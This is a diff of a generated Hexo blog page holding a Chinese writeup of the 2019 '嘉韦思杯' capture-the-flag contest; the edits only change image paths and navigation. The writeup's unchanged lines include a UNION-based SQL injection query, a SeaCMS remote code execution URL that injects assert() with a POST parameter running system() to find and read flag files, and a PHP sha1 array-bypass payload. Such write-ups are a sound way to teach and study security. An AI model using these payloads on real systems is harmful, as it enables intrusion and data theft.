@@ -88,15 +88,15 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="“嘉韦思杯”  writeup By：孙雯   土肥原贤二打开题目，显然是sql注入 爆表：1-1&amp;apos; union select database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4# 得到表名：luozhen,flag,go">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/$res/1.jpg">
-<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/$res/4.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/$res/2.png">
-<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/$res/3.png">
-<meta property="og:updated_time" content="2019-03-31T03:19:33.836Z">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/嘉韦思杯/1.jpg">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/嘉韦思杯/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/嘉韦思杯/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/嘉韦思杯/3.png">
+<meta property="og:updated_time" content="2019-04-19T11:45:53.520Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Hexo">
 <meta name="twitter:description" content="“嘉韦思杯”  writeup By：孙雯   土肥原贤二打开题目，显然是sql注入 爆表：1-1&amp;apos; union select database(),(select group_concat(table_name) from information_schema.tables where table_schema=database()),3,4# 得到表名：luozhen,flag,go">
-<meta name="twitter:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/$res/1.jpg">
+<meta name="twitter:image" content="http://yoursite.com/2019/04/19/“嘉韦思杯”2019.3.30/嘉韦思杯/1.jpg">
 
 
 
@@ -227,16 +227,6 @@
         </li>
       
         
-        <li class="menu-item menu-item-catalogue">
-          <a href="/catalogue/" rel="section">
-            
-              <i class="menu-item-icon fa fa-fw fa-catalogue"></i> <br>
-            
-            目录
-          </a>
-        </li>
-      
-        
         <li class="menu-item menu-item-about">
           <a href="/about/" rel="section">
             
@@ -357,7 +347,7 @@
 <p>最终得到flag{20_welcome_19}</p>
 <h2 id="吴佩孚"><a href="#吴佩孚" class="headerlink" title="吴佩孚"></a>吴佩孚</h2><p>首先base64解密，得到jsfuck，在浏览器控制台进行输出</p>
 <p>得到flag{sdf465454dfgert32}</p>
-<h2 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h2><p>用Audacity打开文件，查看频谱图，<br>得到<img src="$res/1.jpg" alt="1"><br>flag：85a9d4517d4725_b9_8cbc9fd_554216</p>
+<h2 id="死亡真相"><a href="#死亡真相" class="headerlink" title="死亡真相"></a>死亡真相</h2><p>用Audacity打开文件，查看频谱图，<br>得到<img src="嘉韦思杯/1.jpg" alt><br>flag：85a9d4517d4725_b9_8cbc9fd_554216</p>
 <p>文件多次提到zero，将_变为0，再用md5解密<br>得到flag{hsd132456}</p>
 <h2 id="日军空袭"><a href="#日军空袭" class="headerlink" title="日军空袭"></a>日军空袭</h2><p>将文本进行多次base64加密，<br>得到flag乱序fB__l621a4h4g_ai{&amp;i}<br>排序规则：<br>fB__<br>l621<br>a4h4<br>g_ai{&amp;i}<br>将flag排序，得到flag{B64_&amp;_2hai_14i}</p>
 <h2 id="戴星炳"><a href="#戴星炳" class="headerlink" title="戴星炳"></a>戴星炳</h2><p>跑python脚本</p>
@@ -380,15 +370,15 @@
 <p>得到flag{s9li_1s_s0_e4sY}</p>
 <h2 id="作战计划"><a href="#作战计划" class="headerlink" title="作战计划"></a>作战计划</h2><p>海洋CSM有一个任意代码执行漏洞</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=0&amp;year=2333333);phpinfo();//</span><br></pre></td></tr></table></figure>
-<p><img src="$res/4.png" alt="4"></p>
+<p><img src="嘉韦思杯/4.png" alt></p>
 <p>构造payload：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://47.103.43.235:84/search.php?searchtype=5&amp;tid=0&amp;year=2333333);assert($_POST[&quot;raidsh&quot;]);//</span><br><span class="line"></span><br><span class="line">post传参：radish=system(&quot;cat $(find / -name flag*)&quot;)</span><br></pre></td></tr></table></figure>
 <p>得到flag{!!seacms_@@} </p>
 <h2 id="池步洲"><a href="#池步洲" class="headerlink" title="池步洲"></a>池步洲</h2><p>查看网页源代码</p>
-<p><img src="$res/2.png" alt="2"></p>
+<p><img src="嘉韦思杯/2.png" alt></p>
 <p>看到<!--index.phps--></p>
 <p>在url输入<br><a href="http://47.103.43.235:82/web/b/index.phps" target="_blank" rel="noopener">http://47.103.43.235:82/web/b/index.phps</a><br>发现可以下载源代码，打开源码</p>
-<p><img src="$res/3.png" alt="3"></p>
+<p><img src="嘉韦思杯/3.png" alt></p>
 <p>发现sha1()函数，想到用数组绕过，构造payload：</p>
 <p>POST传参：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name[]=1&amp;password[]=2</span><br></pre></td></tr></table></figure></p>
 <p>得到flag{Y0u_just_br0ke_sha1}</p>
@@ -416,7 +406,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2019/04/19/“嘉韦思杯”2019.3.30.resource/commit/" rel="next" title>
+              <a href="/2019/04/19/嘉韦思杯/commit/" rel="next" title>
                 <i class="fa fa-chevron-left"></i> 
               </a>
             
@@ -501,7 +491,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -509,15 +499,6 @@
 
             
 
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                
-                  <span class="site-state-item-count">2</span>
-                  <span class="site-state-item-name">标签</span>
-                
-              </div>
             
 
           </nav>
